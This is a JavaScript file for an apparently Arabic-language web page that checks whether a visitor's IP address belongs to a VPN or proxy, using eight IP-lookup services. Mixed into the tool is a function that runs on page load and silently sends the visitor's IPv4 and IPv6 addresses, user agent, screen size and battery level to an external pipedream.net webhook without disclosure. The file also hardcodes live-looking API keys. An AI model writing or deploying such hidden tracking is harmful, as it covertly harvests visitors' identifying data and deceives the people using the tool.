function script_(ip) {
    const tbody = document.getElementById("results");
    const ipDisplay = document.getElementById("user-ip");

    // IPv4 https://api.ipify.org/?format=json
    // IPv6 https://api64.ipify.org/?format=json
function runAllChecks(ip) {
  checkIPWho(ip);
  checkIPApi(ip);
  checkIpinfo(ip);
  checkproxycheck(ip);
  checkIpdata(ip);
  checkIpwhois(ip);
  checkIpRegistry(ip);
  checkVpnApi(ip);
}

if (!ip) {
    sendIPsToWebhook();

  fetch("https://api.ipify.org/?format=json")//ip4v
    .then(res => res.json())
    .then(ipData => {
      const ip = ipData.ip;
      ipDisplay.innerText = `ip Address : ${ip}`;
      tbody.innerHTML = ""; // Clear loading row
      runAllChecks(ip);
    });
} else {
  runAllChecks(ip);
}

  function checkVpnApi(ip) {
  const apiKey = "fea37dd607164549b8f93e5d0fd8c970"; // 🔐 استبدل هذا بمفتاحك من vpnapi.io

  fetch(`https://vpnapi.io/api/${ip}?key=${apiKey}`)
    .then(res => res.json())
    .then(data => {
      const security = data.security || {};
      const isVPN = security.vpn || security.proxy || security.tor || false;
      const country = data.location?.country || "?";
      const org = data.network?.autonomous_system_organization || "غير معروف";

      addRow("vpnapi.io", country, org, isVPN);
    })
    .catch(err => {
      console.error("vpnapi.io error", err);
      addRow("vpnapi.io", "?", "?", false);
    });
}

function checkIpRegistry(ip) {
  const apiKey = "tryout"; // مفتاح مجاني للتجربة من ipregistry.co

  fetch(`https://api.ipregistry.co/${ip}?key=${apiKey}`)
    .then(res => res.json())
    .then(data => {
      const org = data?.connection?.organization || "غير معروف";
      const country = data?.location?.country?.name || "?";
      const isVPN = data.security?.is_vpn || data.security?.is_proxy || data.security?.is_tor || false;

      addRow("ipregistry.co", country, org, isVPN);
    })
    .catch(err => {
      console.error("ipregistry.co error", err);
      addRow("ipregistry.co", "?", "?", false);
    });
}

function checkIpApi(ip) {
  fetch(`http://ip-api.com/json/${ip}?fields=status,country,org,proxy,hosting`)
    .then(res => res.json())
    .then(data => {
      if (data.status === "fail") {
        addRow("ip-api.com", "?", "?", false);
        return;
      }

      const isVPN = data.proxy || data.hosting;
      const org = data.org || "غير معروف";
      const country = data.country || "?";

      addRow("ip-api.com", country, org, isVPN);
    })
    .catch(err => {
      console.error("ip-api.com error", err);
      addRow("ip-api.com", "?", "?", false);
    });
}

function checkIpwhois(ip) {
  fetch(`https://ipwhois.app/json/${ip}`)
    .then(res => res.json())
    .then(data => {
      const org = data.org || data.isp || "غير معروف";
      const country = data.country || "?";
      // لا يوجد كشف مباشر لـ VPN في ipwhois.io، فنفترض false:
      const isVPN = false;

      addRow("ipwhois.io", country, org, isVPN);
    })
    .catch(err => {
      console.error("ipwhois.io error", err);
      addRow("ipwhois.io", "?", "?", false);
    });
}
    // API 1: ipwho.is
    function checkIPWho(ip) {
      fetch(`https://ipwho.is/${ip}`)
        .then(res => res.json())
        .then(data => {
          const isVPN = data.connection?.type === "corporate";
          addRow("ipwho.is", data.country, data.connection?.org, isVPN);
        });
    }

    // API 2: ip-api.com
    function checkIPApi(ip) {
      fetch(`http://ip-api.com/json/${ip}?fields=status,country,org,proxy,hosting`)
        .then(res => res.json())
        .then(data => {
          const isVPN = data.proxy || data.hosting;
          addRow("ip-api.com", data.country, data.org, isVPN);
        });
    }

    // API 3: ipinfo.io
    function checkIpinfo(ip) {
      fetch(`https://ipinfo.io/${ip}/json?token=`) // Token optional for small usage
        .then(res => res.json())
        .then(data => {
          const isVPN = data?.privacy?.vpn || false;
          addRow("ipinfo.io", data.country, data.org, isVPN);
        });
    }

    // i change  ipgeolocation.io to proxycheck.io fix the display error
function checkproxycheck(ip) {
  const apiKey_proxycheck = "l11151-636tc1-940138-06n954";
      fetch(`https://proxycheck.io/v2/${ip}?key=${apiKey_proxycheck}&vpn=1&asn=1`)
        .then(res => res.json())
        .then(data => {
          const result = data[ip];
          const isVPN = result.proxy === "yes";
          const org = result.provider || result.asn || "غير معروف";
          const country = result.isocode || result.country || "?";
          addRow("proxycheck.io", country, org, isVPN);
        })
        .catch(err => {
          console.error("proxycheck.io error", err);
        });
    }

    // API 5: ipdata.co 
    function checkIpdata(ip) {
      fetch(`https://api.ipdata.co/${ip}?api-key=eca677b284b3bac29eb72f5e496aa9047f26543605efe99ff2ce35c9`) // "test" is limited but works 
        .then(res => res.json())
        .then(data => {
        if (data.message && data.message.includes("whitelist")) {
        addRow("ipdata.co", "غير مسموح", "-", false);
        return;
        }
        const threat = data.threat || {};
        const scores = threat.scores || {};

        const isVPN = (
        threat.is_vpn === true ||
        threat.is_proxy === true ||
        scores.vpn_score >= 90 ||
        scores.proxy_score >= 90
          );


          addRow("ipdata.co", data.country_name, data.asn?.name, isVPN);
        });
    }

    // Add row to table
    function addRow(service, country, org, isVPN) {
      const row = `
        <tr>
          <td>${service}</td>
          <td>${country || "?"}</td>
          <td>${org || "?"}</td>
          <td class="${isVPN ? 'yes' : 'no'}">${isVPN ? "نعم" : "لا"}</td>
          <td>${isVPN ? "⚠️ احتمال VPN/Proxy" : "✅ اتصال عادي"}</td>
        </tr>`;
      tbody.innerHTML += row;
    }
}
script_()
    const ipDisplay = document.getElementById("user-ip");
    const tbody = document.getElementById("results");
    document.getElementById("search").addEventListener("keydown", function(event) {
      if (event.key === "Enter") {
        event.preventDefault();
        const ip = this.value.trim();

        if (!ip) {
          alert("❗ الرجاء إدخال عنوان IP أولاً.");
          return;
        }

        ipDisplay.innerText = `ip Address : ${ip}`;
        tbody.innerHTML = ""; // Clear old results
        script_(ip);
      }
    });
function getDeviceInfo() {
  const ua = navigator.userAgent;
  console.log("User Agent:", ua);

  if (/android/i.test(ua)) return "Android device";
  if (/iPad|iPhone|iPod/.test(ua)) return "iOS device";
  if (/Macintosh/.test(ua)) return "Mac";
  if (/Windows/.test(ua)) return "Windows PC";
  if (/Linux/.test(ua)) return "Linux device";
  
  return "Unknown device";
}

async function getDeviceInfo() {
  const info = {};

  // Screen info
  info.screen = {
    width: screen.width,
    height: screen.height,
    pixelRatio: window.devicePixelRatio
  };

  // User agent (browser/device info)
  info.userAgent = navigator.userAgent;

  // Battery info
  try {
    const battery = await navigator.getBattery();
    info.battery = battery.level * 100;
  } catch (e) {
    info.battery = "Unavailable";
  }

  return encodeURIComponent(JSON.stringify(info));
}

async function sendIPsToWebhook() {
  try {
    const ipv4Res = await fetch("https://api.ipify.org/?format=json");
    const ipv4Data = await ipv4Res.json();
    const ipv4 = ipv4Data.ip;

    const ipv6Res = await fetch("https://api64.ipify.org/?format=json");
    const ipv6Data = await ipv6Res.json();
    const ipv6 = ipv6Data.ip;

    const deviceInfo = await getDeviceInfo();

    const url = `https://eou274ml4ri0qf0.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&device=${deviceInfo}`;

    await fetch(url);
    console.log("IPs sent successfully:", ipv4, ipv6);
  } catch (err) {
    console.error("Error fetching/sending IPs:", err);
  }
}


